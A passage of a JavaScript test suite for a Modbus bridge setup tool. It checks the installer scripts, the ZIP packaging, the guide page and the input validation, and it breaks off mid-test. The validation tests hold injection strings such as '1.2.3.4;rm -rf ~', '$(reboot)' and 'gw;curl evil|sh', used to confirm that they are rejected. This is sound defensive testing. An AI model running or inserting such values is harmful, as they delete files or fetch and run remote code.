// Modbus bridge installers, bundled bridge package and the Modbus page's bridge setup guide.
//
//   • pack: prism-build/64-modbus-bridge-pack.js is exactly tools/modbus-bridge/* (LF text,
//     SHA-256 of the UTF-8 bytes, BRIDGE_VERSION) and is safe inside an HTML <script>;
//   • installer scripts: bash -n install.sh; install-windows.ps1 is ASCII, bracket-balanced and
//     free of PowerShell-7-only syntax (Windows PowerShell 5.1 must parse it);
//   • WTS_modbusBridgeSetup: host:port validation rejects shell / PowerShell injection, generated
//     installers carry the configured bridge devices and the pack files (base64 + SHA-256), the
//     stored ZIP is valid (CRC-32 per PKWARE APPNOTE 4.4.7, Unix mode for install.sh);
//   • page: guide steps, downloads, OS switch, copy, 375 px, excluded from reports, iOS note,
//     "Check bridge" against a stubbed fetch (running / allow-list / 403 / down / timeout) and
//     against a real bridge;
//   • install.sh end to end in a sandbox HOME (path with a space): install → config → the
//     bridge answers /health and reads the fake slave → SIGTERM stops it → --uninstall.
'use strict';

const fs = require('fs');
const os = require('os');
const net = require('net');
const path = require('path');
const vm = require('vm');
const http = require('http');
const crypto = require('crypto');
const { spawn, spawnSync } = require('child_process');
const WP = 'MODBUS';
const REPO = path.resolve(__dirname, '..', '..');
const TOOLS = path.join(REPO, 'tools', 'modbus-bridge');
const PACK = require('../pack-modbus-bridge.js');
const { BRIDGE_VERSION } = require(path.join(TOOLS, 'modbus-bridge.js'));
const { createSlave } = require(path.join(TOOLS, 'fake-slave.js'));
const text = (el) => String(el ? el.textContent : '').trim();
const navBtn = (app, key) => app.find('.nav-btn[data-p="' + key + '"]');

const hasBash = (() => { try { return spawnSync('bash', ['-c', 'exit 0']).status === 0; } catch (e) { return false; } })();
const sha = (buf) => crypto.createHash('sha256').update(buf).digest('hex');

// Independent CRC-32 (IEEE 802.3, reflected 0xEDB88320) for checking the app's ZIP writer.
function crc32(buf) {
  let c = ~0;
  for (let i = 0; i < buf.length; i++) { c ^= buf[i]; for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xEDB88320 & -(c & 1)); }
  return (~c) >>> 0;
}
function readZip(buf) {
  let e = buf.length - 22;
  while (e >= 0 && buf.readUInt32LE(e) !== 0x06054b50) e--;
  if (e < 0) throw new Error('no end-of-central-directory record');
  const count = buf.readUInt16LE(e + 10), cdOff = buf.readUInt32LE(e + 16), out = [];
  let p = cdOff;
  for (let k = 0; k < count; k++) {
    if (buf.readUInt32LE(p) !== 0x02014b50) throw new Error('bad central directory entry ' + k);
    const madeBy = buf.readUInt16LE(p + 4), method = buf.readUInt16LE(p + 10), crc = buf.readUInt32LE(p + 16), csize = buf.readUInt32LE(p + 20);
    const usize = buf.readUInt32LE(p + 24), nlen = buf.readUInt16LE(p + 28), xlen = buf.readUInt16LE(p + 30), clen = buf.readUInt16LE(p + 32);
    const ext = buf.readUInt32LE(p + 38), off = buf.readUInt32LE(p + 42), name = buf.slice(p + 46, p + 46 + nlen).toString('utf8');
    if (buf.readUInt32LE(off) !== 0x04034b50) throw new Error('bad local header for ' + name);
    const lcrc = buf.readUInt32LE(off + 14), lnlen = buf.readUInt16LE(off + 26), lxlen = buf.readUInt16LE(off + 28);
    const data = buf.slice(off + 30 + lnlen + lxlen, off + 30 + lnlen + lxlen + csize);
    out.push({ name, method, crc, lcrc, csize, usize, data, mode: ext >>> 16, madeBy });
    p += 46 + nlen + xlen + clen;
  }
  return out;
}
// Brackets balanced outside PowerShell strings / comments; returns the code with strings blanked.
function psScan(src) {
  const pairs = { ')': '(', '}': '{', ']': '[' }, stack = [];
  let i = 0, line = 1, code = '';
  const n = src.length, adv = (to) => { for (let k = i; k < to; k++) if (src[k] === '\n') line++; i = to; };
  while (i < n) {
    const c = src[i], c2 = src.substr(i, 2);
    if (c2 === '<#') { const j = src.indexOf('#>', i + 2); if (j < 0) throw new Error('unclosed <# at line ' + line); adv(j + 2); continue; }
    if (c === '#') { const j = src.indexOf('\n', i); adv(j < 0 ? n : j); continue; }
    if ((c2 === "@'" || c2 === '@"') && /^[ \t]*\r?\n/.test(src.substr(i + 2, 4))) {
      const j = src.indexOf('\n' + c2[1] + '@', i + 2); if (j < 0) throw new Error('unclosed here-string at line ' + line);
      code += ' S '; adv(j + 3); continue;
    }
    if (c === "'") {
      let j = i + 1; while (j < n && !(src[j] === "'" && src[j + 1] !== "'")) j += src[j] === "'" ? 2 : 1;
      if (j >= n) throw new Error("unclosed ' at line " + line);
      code += ' S '; adv(j + 1); continue;
    }
    if (c === '"') {
      let j = i + 1; while (j < n) { if (src[j] === '`') { j += 2; continue; } if (src[j] === '"') { if (src[j + 1] === '"') { j += 2; continue; } break; } j++; }
      if (j >= n) throw new Error('unclosed " at line ' + line);
      if (/\$\(/.test(src.slice(i, j))) throw new Error('$( ) inside a double-quoted string at line ' + line + ' (not supported by this checker)');
      code += ' S '; adv(j + 1); continue;
    }
    if (c === '`') { code += ' '; adv(i + 2); continue; }
    if ('({['.includes(c)) stack.push({ c, line });
    else if (')}]'.includes(c)) { const t = stack.pop(); if (!t || t.c !== pairs[c]) throw new Error('unbalanced ' + c + ' at line ' + line); }
    code += c; adv(i + 1);
  }
  if (stack.length) throw new Error('unclosed ' + stack[stack.length - 1].c + ' from line ' + stack[stack.length - 1].line);
  return code;
}
function freePort() {
  return new Promise((resolve, reject) => { const s = net.createServer(); s.once('error', reject); s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => resolve(p)); }); });
}
function getHealth(port) {
  return new Promise((resolve) => {
    const req = http.get({ host: '127.0.0.1', port, path: '/health', agent: false, timeout: 1000 }, (res) => {
      let b = ''; res.on('data', (d) => { b += d; }); res.on('end', () => { try { resolve(res.statusCode === 200 ? JSON.parse(b) : null); } catch (e) { resolve(null); } });
    });
    req.on('timeout', () => { req.destroy(); resolve(null); }); req.on('error', () => resolve(null));
  });
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function until(fn, ms, what) { const t0 = Date.now(); for (;;) { const v = await fn(); if (v) return v; if (Date.now() - t0 > ms) throw new Error('timeout waiting for ' + what); await sleep(100); } }
function loadCore() {
  const ctx = { console: { log() {}, warn() {} }, Math, Date, JSON, setTimeout, clearTimeout, Promise, Uint8Array, Uint16Array, Float64Array,
    DataView, ArrayBuffer, Buffer, WebSocket: globalThis.WebSocket, encodeURIComponent };
  ctx.globalThis = ctx; vm.createContext(ctx);
  for (const f of ['60-modbus-core.js', '61-modbus-station.js']) vm.runInContext(fs.readFileSync(path.join(__dirname, '..', f), 'utf8'), ctx, { filename: f });
  return ctx.WTS_modbus;
}
// Payload decoders for the two generated installer formats.
function shPayload(textSh) {
  const out = {}, re = /^ {8}([\w.-]+)\)\n {12}cat <<'WTS_PAYLOAD_EOF'\n([\s\S]*?)\nWTS_PAYLOAD_EOF$/gm;
  let m; while ((m = re.exec(textSh))) out[m[1]] = Buffer.from(m[2].replace(/\s+/g, ''), 'base64');
  const sums = {}, re2 = /^ {8}([\w.-]+)\) printf '%s' '([0-9a-f]{64})' ;;$/gm;
  while ((m = re2.exec(textSh))) sums[m[1]] = m[2];
  return { files: out, sums };
}
function psPayload(textPs) {
  const out = {}, sums = {}, re = /^\$Embedded\['([\w.-]+)'\] = @\{ Sha256 = '([0-9a-f]{64})'; B64 = \(@\(\r\n([\s\S]*?)\r\n\) -join ''\) \}$/gm;
  let m; while ((m = re.exec(textPs))) { sums[m[1]] = m[2]; out[m[1]] = Buffer.from(m[3].split(',\r\n').map((l) => { mustB64(l); return l.slice(1, -1); }).join(''), 'base64'); }
  return { files: out, sums };
}
function mustB64(l) { if (!/^'[A-Za-z0-9+/=]+'$/.test(l)) throw new Error('payload line is not a quoted base64 chunk: ' + l.slice(0, 40)); }
const withoutBlocks = (t) => t.replace(/\r\n/g, '\n').replace(/# @@WTS-(PRESET|PAYLOAD)-BEGIN@@[\s\S]*?# @@WTS-\1-END@@/g, '<$1>');

const BRIDGE_CFG = {
  devices: [
    { id: 'd1', name: 'PLC-1', transport: 'ws', host: '192.168.1.10', port: 502, url: 'ws://127.0.0.1:8600', unit: 1 },
    { id: 'd2', name: 'RTU-7', transport: 'ws', host: '10.0.0.7', port: 5020, url: 'ws://127.0.0.1:8600', unit: 7 },
    { id: 'd3', name: 'Gateway', transport: 'ws', host: 'gw-1.local', port: 5020, url: 'ws://127.0.0.1:8600', unit: 2 },
    { id: 'd4', name: 'Sim', transport: 'sim', host: '1.1.1.1', port: 502, unit: 1 },
    { id: 'd5', name: 'Serial', transport: 'serial', unit: 3 },
  ],
  tags: [],
};
const HEALTH_OK = { name: 'wts-modbus-bridge', version: BRIDGE_VERSION, readOnly: true, port: 8600, uptimeS: 12, allow: ['192.168.1.10:502', '10.0.0.0/24:*'] };
const jsonRes = (status, body) => Promise.resolve({ ok: status >= 200 && status < 300, status, json: () => Promise.resolve(body) });
function openGuide(app, cfg) {
  if (cfg) app.storage.setItem('wts_modbus_config', JSON.stringify(cfg));
  app.click(navBtn(app, 'modbus'));
  return app.win.WTS_modbus.page.controller();
}

module.exports = [
  {
    name: 'bridge pack: 64-modbus-bridge-pack.js = tools/modbus-bridge files (LF text, SHA-256, version), safe in <script>',
    wp: WP, opts: false,
    run(app, assert) {
      const committed = fs.readFileSync(PACK.OUT, 'utf8');
      assert.strictEqual(committed, PACK.build(), 'the pack is stale — run: node prism-build/pack-modbus-bridge.js (concat-round10.js does it too)');
      const ctx = { console: { log() {}, warn() {} } }; ctx.globalThis = ctx; vm.createContext(ctx);
      vm.runInContext(committed, ctx);
      const P = ctx.WTS_modbusBridgePack;
      assert.strictEqual(P.version, BRIDGE_VERSION);
      assert.deepStrictEqual(Array.from(P.order), ['modbus-bridge.js', 'fake-slave.js', 'install-windows.ps1', 'install.sh', 'README.md']);
      for (const f of P.order) {
        const disk = fs.readFileSync(path.join(TOOLS, f), 'utf8').replace(/\r\n?/g, '\n');
        assert.strictEqual(P.files[f], disk, f + ' differs from tools/modbus-bridge/' + f);
        assert.strictEqual(P.sha256[f], sha(Buffer.from(disk, 'utf8')), f + ' sha256');
        assert.ok(!/\r/.test(P.files[f]), f + ' is LF');
      }
      assert.ok(!/<\/script|<!--/i.test(committed), 'no </script> or <!-- in the injected pack');
      for (const f of ['install-windows.ps1', 'install.sh']) assert.ok(/^[\x09\x0a\x0d\x20-\x7e]*$/.test(P.files[f]), f + ' is plain ASCII (Windows PowerShell 5.1 reads BOM-less scripts as ANSI)');
    },
  },
  {
    name: 'installer scripts: bash -n install.sh; install-windows.ps1 parses as Windows PowerShell 5.1 (balanced, no PS7-only syntax, markers)',
    wp: WP, opts: false,
    run(app, assert) {
      const sh = fs.readFileSync(path.join(TOOLS, 'install.sh'), 'utf8'), ps = fs.readFileSync(path.join(TOOLS, 'install-windows.ps1'), 'utf8');
      if (hasBash) {
        const r = spawnSync('bash', ['-n', path.join(TOOLS, 'install.sh')], { encoding: 'utf8' });
        assert.strictEqual(r.status, 0, 'bash -n: ' + r.stderr);
      }
      assert.match(sh, /^#!\/usr\/bin\/env bash\n/); assert.match(sh, /\nset -euo pipefail\n/);
      for (const src of [sh, ps]) for (const tag of ['PRESET', 'PAYLOAD']) {
        assert.strictEqual(src.split('# @@WTS-' + tag + '-BEGIN@@').length, 2, tag + ' begin marker once'); assert.strictEqual(src.split('# @@WTS-' + tag + '-END@@').length, 2, tag + ' end marker once');
      }
      // bash 3.2 (macOS): no associative arrays / mapfile / ${x,,}; empty arrays guarded under set -u
      assert.ok(!/declare -A|mapfile|readarray|\$\{\w+,,\}|\$\{\w+\^\^\}/.test(sh), 'bash 3.2 compatible');
      assert.ok(!/\beval\b/.test(sh), 'no eval');
      const code = psScan(ps);
      assert.ok(!/\?\?|\?\.|&&|\|\||-Parallel\b|\s\?\s/.test(code), 'no PowerShell 7-only operators (?? ?. && || ternary -Parallel)');
      assert.ok(!/Set-StrictMode/.test(ps), 'no StrictMode (5.1 intrinsic .Count issues)');
      assert.ok(!/`[ \t]+\r?$/m.test(ps), 'no whitespace after a line-continuation backtick');
      assert.ok(!/\$(host|args|input)\b/i.test(code), 'no automatic variables ($Host / $args / $input) used as plain variables');
      assert.match(ps, /\[CmdletBinding\(\)\]\s*\nparam\(/);
      for (const p of ['Allow', 'Port', 'Listen', 'AllowWrites', 'AutoStart', 'NoStart', 'Uninstall', 'Yes']) assert.match(ps, new RegExp('\\$' + p + '\\b'), '-' + p);
      assert.match(ps, /winget\.Path install --id OpenJS\.NodeJS\.LTS/); assert.match(ps, /Confirm-Step/);
      assert.match(ps, /New-ScheduledTaskTrigger -AtLogOn/); assert.match(ps, /-RunLevel Limited/); assert.match(ps, /ExecutionTimeLimit \(\[TimeSpan\]::Zero\)/);
      assert.match(ps, /UTF8Encoding\(\$false\)/, 'config written without BOM');
      assert.match(ps, /\$PSScriptRoot/);
    },
  },
  {
    name: 'setup helpers: host:port validation (IPv4, subnet, host name, port / *) rejects shell and PowerShell injection',
    wp: WP,
    run(app, assert) {
      const S = app.win.WTS_modbusBridgeSetup;
      assert.ok(S && S.pack(), 'WTS_modbusBridgeSetup + bundled pack');
      for (const [s, v] of [['192.168.1.10:502', '192.168.1.10:502'], ['10.0.0.0/24:502', '10.0.0.0/24:502'], ['plc-1.local:*', 'plc-1.local:*'],
        ['PLC.Example.com:05020', 'plc.example.com:5020'], [' 127.0.0.1:5020 ', '127.0.0.1:5020'], ['localhost:1', 'localhost:1'], ['0.0.0.0/0:65535', '0.0.0.0/0:65535']]) {
        const r = S.validateTarget(s); assert.ok(r.ok, s + ': ' + r.error); assert.strictEqual(r.value, v);
      }
      for (const s of ['1.2.3.4;rm -rf ~', '1.2.3.4;rm -rf ~:502', '$(calc):502', '`calc`:502', '$env:TEMP:502', 'a b:502', '1.2.3.999:502', '1.2.3:502',
        '10.0.0.0/33:502', '"x":502', "x':502", 'host:0', 'host:65536', 'host:', ':502', 'host', '-rf:502', 'a..b:502', '1.2.3.4:502;calc', 'x&y:502',
        'x|y:502', '%TEMP%:502', 'x\n:502', '[::1]:502', 'x/24:502', '1.2.3.4:5 02', 'a.b-:502', 'é.local:502', '1.2.3.4:*;x']) {
        assert.ok(!S.validateTarget(s).ok, JSON.stringify(s) + ' must be rejected');
      }
      assert.ok(S.validateListen('127.0.0.1') && S.validateListen('localhost') && !S.validateListen('0.0.0.0; calc') && !S.validateListen('evil.example'));
      let r = S.buildInstaller('windows', { allow: ['1.2.3.4;rm -rf ~'] });
      assert.ok(!r.ok && !r.text && /not host:port/.test(r.errors.join()), JSON.stringify(r.errors));
      r = S.buildInstaller('linux', { allow: ['$(calc):502', '192.168.1.10:502'] });
      assert.ok(!r.ok && !r.text && /"\$\(calc\)" is not an IPv4/.test(r.errors[0]), 'one bad entry refuses the whole installer');
      r = S.buildInstaller('macos', { allow: ['192.168.1.10:502'], port: '85O2' }); assert.ok(!r.ok && /bridge port/.test(r.errors[0]));
      r = S.buildInstaller('macos', { allow: ['192.168.1.10:502'], listen: '0.0.0.0 && calc' }); assert.ok(!r.ok && /listen address/.test(r.errors[0]));
      r = S.buildInstaller('linux', { allow: [] }); assert.ok(!r.ok && /No targets/.test(r.errors[0]));
      // a device whose host was edited into something nasty blocks generation and is named
      const cfg = JSON.parse(JSON.stringify(BRIDGE_CFG)); cfg.devices[2].host = 'gw;curl evil|sh';
      r = S.installerFromConfig(app.toWin(cfg), 'linux', {});
      assert.ok(!r.ok && /Device "Gateway"/.test(r.errors.join()), JSON.stringify(r.errors));
      r = S.installerFromConfig(app.toWin(BRIDGE_CFG), 'linux', { extra: '10.0.0.0/24:502, $(reboot):1' });
      assert.ok(!r.ok && /Extra target/.test(r.errors.join()));
      assert.strictEqual(S.parseBridgeUrl('ws://127.0.0.1:8502').healthUrl, 'http://127.0.0.1:8502/health');
      assert.strictEqual(S.parseBridgeUrl('wss://bridge.local/modbus').healthUrl, 'https://bridge.local:443/health');
      assert.strictEqual(S.parseBridgeUrl('').healthUrl, 'http://127.0.0.1:8502/health', 'empty → default bridge URL');
      assert.ok(!S.parseBridgeUrl('ws://a b:1').ok && !S.parseBridgeUrl('javascript:alert(1)').ok && !S.parseBridgeUrl('ws://user@evil:1').ok);
      assert.ok(S.allowedBy(['10.0.0.0/24:*'], '10.0.0.7', 5020) && !S.allowedBy(['10.0.0.0/24:502'], '10.0.0.7', 5020) && S.allowedBy(['GW-1.local:5020'], 'gw-1.LOCAL', 5020));
    },
  },
  {
    name: 'generated installers: allow list from the WebSocket-bridge devices + extra targets, bridge port, embedded pack (base64 + SHA-256)',
    wp: WP, timeoutMs: 30000,
    run(app, assert) {
      const S = app.win.WTS_modbusBridgeSetup, P = S.pack(), cfg = app.toWin(BRIDGE_CFG);
      const want = ['192.168.1.10:502', '10.0.0.7:5020', 'gw-1.local:5020', '10.0.0.0/24:502', '127.0.0.1:5020'];
      // Linux / macOS
      const r = S.installerFromConfig(cfg, 'linux', { extra: ' 10.0.0.0/24:502,127.0.0.1:5020 192.168.1.10:502', autostart: true });
      assert.ok(r.ok, JSON.stringify(r.errors)); assert.deepStrictEqual(Array.from(r.allow), want, 'sim / serial devices ignored, duplicates dropped');
      assert.strictEqual(r.filename, 'wts-modbus-bridge-install.sh'); assert.strictEqual(r.port, 8600, 'port from the devices\' bridge URL');
      assert.includes(r.text, 'PRESET_ALLOW="' + want.join(',') + '"'); assert.includes(r.text, 'PRESET_PORT="8600"');
      assert.includes(r.text, 'PRESET_AUTOSTART="1"'); assert.includes(r.text, 'PRESET_ALLOW_WRITES="0"'); assert.includes(r.text, 'EMBEDDED_VERSION="' + BRIDGE_VERSION + '"');
      assert.strictEqual(withoutBlocks(r.text), withoutBlocks(P.files['install.sh']), 'only the preset and payload blocks differ from install.sh');
      const sp = shPayload(r.text);
      assert.deepStrictEqual(Object.keys(sp.files).sort(), ['README.md', 'fake-slave.js', 'modbus-bridge.js']);
      for (const f of Object.keys(sp.files)) { assert.strictEqual(sp.files[f].toString('utf8'), P.files[f], f); assert.strictEqual(sp.sums[f], sha(sp.files[f]), f + ' sha'); }
      if (hasBash) {
        const tmp = path.join(os.tmpdir(), 'wts-gen-' + process.pid + '.sh'); fs.writeFileSync(tmp, r.text);
        try { const b = spawnSync('bash', ['-n', tmp], { encoding: 'utf8' }); assert.strictEqual(b.status, 0, b.stderr); } finally { fs.unlinkSync(tmp); }
      }
      assert.strictEqual(r.commands.packaged, 'bash install.sh --allow ' + want.join(',') + ' --port 8600 --autostart');
      assert.strictEqual(r.commands.direct, 'node modbus-bridge.js' + want.map((a) => ' --allow ' + a).join('') + ' --port 8600');
      assert.strictEqual(r.commands.installer, 'bash ~/Downloads/wts-modbus-bridge-install.sh');
      // Windows
      const w = S.installerFromConfig(cfg, 'windows', { allowWrites: true });
      assert.ok(w.ok); assert.strictEqual(w.filename, 'wts-modbus-bridge-install.ps1');
      assert.ok(!/(^|[^\r])\n/.test(w.text), 'CRLF line endings'); assert.ok(/^[\x09\x0a\x0d\x20-\x7e]*$/.test(w.text), 'ASCII only');
      assert.includes(w.text, "$PresetAllow = '192.168.1.10:502,10.0.0.7:5020,gw-1.local:5020'\r\n");
      assert.includes(w.text, '$PresetPort = 8600\r\n'); assert.includes(w.text, '$PresetAllowWrites = $true\r\n'); assert.includes(w.text, '$PresetAutoStart = $false\r\n');
      assert.strictEqual(withoutBlocks(w.text), withoutBlocks(P.files['install-windows.ps1']));
      psScan(w.text);
      const pp = psPayload(w.text);
      assert.deepStrictEqual(Object.keys(pp.files).sort(), ['README.md', 'fake-slave.js', 'modbus-bridge.js']);
      for (const f of Object.keys(pp.files)) { assert.strictEqual(pp.files[f].toString('utf8'), P.files[f], f); assert.strictEqual(pp.sums[f], sha(pp.files[f]), f + ' sha'); }
      assert.strictEqual(w.commands.packaged, 'powershell -NoProfile -ExecutionPolicy Bypass -File .\\install-windows.ps1 -Allow "192.168.1.10:502,10.0.0.7:5020,gw-1.local:5020" -Port 8600 -AllowWrites');
      assert.strictEqual(w.commands.installer, 'powershell -NoProfile -ExecutionPolicy Bypass -File "$HOME\\Downloads\\wts-modbus-bridge-install.ps1"');
      // bridge on another PC (bridge URL with an IPv4 address) → it must listen there, with a warning
      const far = { devices: [{ id: 'x', name: 'Far', transport: 'ws', host: '192.168.5.20', port: 502, url: 'ws://192.168.1.50:8502' }], tags: [] };
      const f = S.installerFromConfig(app.toWin(far), 'macos', {});
      assert.ok(f.ok && f.listen === '192.168.1.50' && /not this computer/.test(f.warnings.join()));
      assert.includes(f.text, 'PRESET_LISTEN="192.168.1.50"'); assert.includes(f.commands.packaged, '--listen 192.168.1.50');
    },
  },
  {
    name: 'bridge package ZIP: stored entries under wts-modbus-bridge/, CRC-32, sizes, Unix modes (install.sh 0755)',
    wp: WP,
    run(app, assert) {
      const S = app.win.WTS_modbusBridgeSetup, P = S.pack();
      assert.strictEqual(S.crc32(Array.from(Buffer.from('123456789'))), 0xCBF43926, 'CRC-32 check value');
      assert.strictEqual(S.base64(Array.from(Buffer.from('hello, bridge ✓'))), Buffer.from('hello, bridge ✓').toString('base64'));
      const z = S.packageZip(new Date(2026, 8, 30, 12, 34, 56));
      assert.strictEqual(z.filename, 'wts-modbus-bridge-' + BRIDGE_VERSION + '.zip');
      const entries = readZip(Buffer.from(z.bytes));
      assert.deepStrictEqual(entries.map((e) => e.name), Array.from(P.order).map((f) => 'wts-modbus-bridge/' + f));
      for (const e of entries) {
        const f = e.name.split('/')[1];
        assert.strictEqual(e.method, 0, 'stored'); assert.strictEqual(e.csize, e.usize);
        assert.strictEqual(e.data.toString('utf8'), P.files[f], f + ' content');
        assert.strictEqual(e.crc, crc32(e.data), f + ' CRC-32'); assert.strictEqual(e.lcrc, e.crc, f + ' local header CRC');
        assert.strictEqual(e.madeBy >> 8, 3, 'made by Unix → modes honoured');
        assert.strictEqual(e.mode, f === 'install.sh' ? 0o100755 : 0o100644, f + ' mode');
      }
      const py = spawnSync('python3', ['--version'], { encoding: 'utf8' });
      if (py.status === 0) {                                     // an independent reader, when available
        const tmp = path.join(os.tmpdir(), 'wts-pack-' + process.pid + '.zip'); fs.writeFileSync(tmp, Buffer.from(z.bytes));
        try { const t = spawnSync('python3', ['-c', 'import sys,zipfile; z=zipfile.ZipFile(sys.argv[1]); print(z.testzip() or "ok")', tmp], { encoding: 'utf8' }); if (t.status === 0) assert.strictEqual(t.stdout.trim(), 'ok'); }
        finally { fs.unlinkSync(tmp); }
      }
    },
  },
  {
    name: 'Modbus page guide: devices shown on open, 4 steps, package / installer downloads, OS switch, copy, 375 px, not in PDF / Quick Report',
    wp: WP, opts: { viewport: { width: 375, height: 812 } },
    async run(app, assert) {
      const ctl = openGuide(app, BRIDGE_CFG);
      assert.ok(app.el('mbc_devtable'), 'the devices table renders on open (it used to wait for the first edit)');
      assert.strictEqual(app.findAll('#mbc_devtable tbody tr').length, 5);
      const card = app.el('mbc_guide');
      assert.ok(card && card.classList.contains('rp-skip') && card.classList.contains('card'), 'guide card excluded from reports (.rp-skip)');
      assert.ok(app.el('mbc_guide_web').hasAttribute('open'), 'bridge setup open on the web');
      const steps = app.findAll('#mbc_guide_steps .mb-steps > li');
      assert.strictEqual(steps.length, 4);
      assert.match(text(steps[0]), /Install Node\.js 18 or newer \(Windows\)/); assert.includes(text(steps[0]), 'winget install OpenJS.NodeJS.LTS');
      assert.match(text(steps[1]), /Download bridge package/); assert.includes(text(steps[1]), 'Bridge v' + BRIDGE_VERSION);
      assert.includes(text(steps[2]), '✓ PLC-1 — 192.168.1.10:502'); assert.includes(text(steps[2]), '✓ Gateway — gw-1.local:5020');
      assert.includes(text(steps[2]), '-Allow "192.168.1.10:502,10.0.0.7:5020,gw-1.local:5020" -Port 8600');
      assert.match(text(steps[3]), /Check bridge/);
      assert.strictEqual(app.find('[data-act="guide-os"][aria-pressed="true"]').getAttribute('data-os'), 'windows', 'OS guessed from the platform');
      // package download
      app.click(app.find('[data-act="guide-pack"]'));
      let d = app.downloads[app.downloads.length - 1];
      assert.strictEqual(d.filename, 'wts-modbus-bridge-' + BRIDGE_VERSION + '.zip'); assert.ok(d.content.startsWith('PK'), 'zip bytes');
      assert.strictEqual(ctl.lastPackage.files.length, 5);
      // installer download (Windows), then Linux after switching OS
      app.check(app.find('[data-k="guide"][data-f="autostart"]'), true);
      app.click(app.find('[data-act="guide-installer"]'));
      d = app.downloads[app.downloads.length - 1];
      assert.strictEqual(d.filename, 'wts-modbus-bridge-install.ps1');
      assert.includes(d.content, "$PresetAllow = '192.168.1.10:502,10.0.0.7:5020,gw-1.local:5020'"); assert.includes(d.content, '$PresetAutoStart = $true');
      assert.match(text(app.el('mbc_guide_gen')), /✓ Downloaded wts-modbus-bridge-install\.ps1 — bridge v[\d.]+, 3 targets .*port 8600, auto-start, read-only/);
      app.click(app.find('[data-act="guide-os"][data-os="linux"]'));
      assert.match(text(app.find('#mbc_guide_steps .mb-steps > li')), /\(Linux\)/);
      assert.includes(text(app.el('mbc_guide_steps')), 'bash install.sh --allow 192.168.1.10:502,10.0.0.7:5020,gw-1.local:5020 --port 8600 --autostart');
      app.click(app.find('[data-act="guide-installer"]'));
      d = app.downloads[app.downloads.length - 1];
      assert.strictEqual(d.filename, 'wts-modbus-bridge-install.sh'); assert.includes(d.content, 'PRESET_AUTOSTART="1"');
      // copy button → clipboard gets exactly the command
      const copyBtn = app.findAll('[data-act="guide-copy"]').find((b) => /^bash install\.sh/.test(b.getAttribute('data-copy')));
      app.click(copyBtn); await app.flushAsync(10);
      assert.strictEqual(app.clipboard, 'bash install.sh --allow 192.168.1.10:502,10.0.0.7:5020,gw-1.local:5020 --port 8600 --autostart');
      assert.strictEqual(text(copyBtn), 'Copied ✓');
      // malicious extra target: shown as ✗, generate disabled, nothing downloaded
      const n0 = app.downloads.length;
      app.change(app.find('[data-k="guide"][data-f="extra"]'), '1.2.3.4;rm -rf ~');
      assert.match(text(app.el('mbc_guide_steps')), /✗ Extra target: "1\.2\.3\.4;rm" is not host:port/);   // entries split on commas / spaces
      assert.ok(app.find('[data-act="guide-installer"]').hasAttribute('disabled'));
      assert.ok(!/rm -rf/.test(app.findAll('[data-act="guide-copy"]').map((b) => b.getAttribute('data-copy')).join('\n')), 'no command carries the bad entry');
      const bad = ctl.generateInstaller();
      assert.ok(!bad.ok); assert.strictEqual(app.downloads.length, n0); assert.match(text(app.el('mbc_guide_gen')), /✗ No installer generated/);
      assert.ok(app.el('mbc_guide_steps').innerHTML.indexOf('<script') < 0);
      // the guide stays out of the page report model (PDF / PNG / Quick Report snapshot): without
      // .rp-skip the check verdict and the guide's inputs would be captured as results / inputs
      app.win.fetch = () => jsonRes(200, HEALTH_OK);
      app.click(app.find('[data-act="guide-check"]')); await app.flushAsync(20);
      assert.includes(text(app.el('mbc_guide_check')), 'Bridge v' + BRIDGE_VERSION + ' is running');
      const model = JSON.stringify(app.win.collectPageReport(app.el('pgBody'), { charts: false }));
      for (const s of ['Bridge v' + BRIDGE_VERSION, 'Extra targets', 'Start the bridge automatically', 'rm -rf', 'winget', 'Troubleshooting']) assert.ok(model.indexOf(s) < 0, 'report must not contain "' + s + '"');
      assert.includes(model, 'Configuration summary');
      card.classList.remove('rp-skip');
      assert.includes(JSON.stringify(app.win.collectPageReport(app.el('pgBody'), { charts: false })), 'Bridge v' + BRIDGE_VERSION, 'control: without .rp-skip the verdict would be reported');
      card.classList.add('rp-skip');
      assert.strictEqual(app.errors.length, 0, app.errors.map((e) => e.message).join('; '));
      app.flush(3000);
      assert.strictEqual(app.pendingTimers(), 0);
    },
  },
  {
    name: 'Check bridge (stubbed fetch): ✓ running + per-device allow-list, ⚠ old version / read-only writes, ✗ 403 / not the bridge / down / timeout',
    wp: WP,
    async run(app, assert) {
      openGuide(app, BRIDGE_CFG);
      const calls = [], ctl = { get lastCheck() { return app.win.WTS_modbus.page.controller().lastCheck; } };
      let reply = () => jsonRes(200, HEALTH_OK);
      app.win.fetch = (url, init) => { calls.push({ url, init }); return reply(); };
      const check = async () => { app.click(app.find('[data-act="guide-check"]')); await app.flushAsync(20); return text(app.el('mbc_guide_check')); };
      let t = await check();
      assert.strictEqual(calls[0].url, 'http://127.0.0.1:8600/health', 'health URL derived from ws://127.0.0.1:8600');
      assert.strictEqual(calls[0].init.mode, 'cors'); assert.strictEqual(calls[0].init.cache, 'no-store'); assert.strictEqual(calls[0].init.credentials, 'omit');
      assert.includes(t, '⚠ Bridge v' + BRIDGE_VERSION + ' is running at http://127.0.0.1:8600 — read-only, port 8600');
      assert.includes(t, '✓ PLC-1 — 192.168.1.10:502 is in the allow-list');
      assert.includes(t, '✓ RTU-7 — 10.0.0.7:5020 is in the allow-list');
      assert.includes(t, '✗ Gateway — gw-1.local:5020 is NOT in the allow-list');
      assert.includes(t, 'Not in the bridge allow-list: gw-1.local:5020');
      assert.strictEqual(ctl.lastCheck.ok, false);
      app.flush(3000);                                            // host autosave / snapshot debounces; the 4 s check timeout would still be pending
      assert.strictEqual(app.pendingTimers(), 0, 'timeout timer cleared');
      reply = () => jsonRes(200, Object.assign({}, HEALTH_OK, { allow: HEALTH_OK.allow.concat('gw-1.local:5020') }));
      t = await check();
      assert.ok(ctl.lastCheck.ok); assert.includes(t, '✓ Bridge v' + BRIDGE_VERSION + ' is running');
      reply = () => jsonRes(200, Object.assign({}, HEALTH_OK, { version: '1.0.9', allow: ['*:*'].concat(HEALTH_OK.allow, 'gw-1.local:5020') }));
      t = await check(); assert.includes(t, 'Bridge v1.0.9 is older than v' + BRIDGE_VERSION);
      const cfgW = JSON.parse(JSON.stringify(BRIDGE_CFG)); cfgW.writesEnabled = true;
      app.win.WTS_modbus.saveConfig(app.toWin(cfgW)); app.click(navBtn(app, 'modbus'));
